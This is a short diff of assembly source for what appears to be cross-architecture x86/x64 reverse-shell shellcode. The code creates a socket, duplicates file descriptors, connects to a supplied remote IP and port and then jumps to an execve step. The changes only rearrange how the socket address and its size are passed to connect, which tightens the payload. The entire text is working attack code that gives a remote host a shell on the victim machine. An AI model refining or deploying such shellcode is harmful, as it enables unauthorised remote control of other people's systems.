@@ -47,8 +47,8 @@
     push    eax
     mov     dword[esp+0], ecx ; save port
     mov     dword[esp+4], edx ; save ip
-    push    16                ; sizeof(sa)
-    push    esp               ; &sa 
+    push    esp               ; &sa
+    pop     ebp
     
     ; step 1, create a socket
     ; x64: socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
@@ -80,8 +80,9 @@ x64_dup2:
     
     ; step 3, connect to remote host
     ; connect (s, &sa, sizeof(sa));
-    pop     esi         ; rsi = &sa 
-    pop     edx         ; rdx = sizeof(sa)
+    push    ebp
+    pop     esi         ; rsi = &sa
+    mov     dl, 16      ; rdx = sizeof(sa)
     mov     al, 42      ; rax = sys_connect
     syscall    
     jmp     x84_execve
@@ -109,10 +110,10 @@ x86_dup2:
     dec     ecx
     jns     x86_dup2    ; jump if not signed
     
-    pop     eax         ; eax = AF_INET or 1
-    pop     eax         ; eax = IPPROTO_IP or 0
     ; step 3, connect to remote host
     ; connect (s, &sa, sizeof(sa));
+    push    16          ; sizeof(sa) 
+    push    ebp         ; &sa
     push    ebx         ; s
     push    esp
     pop     ecx         ; &args
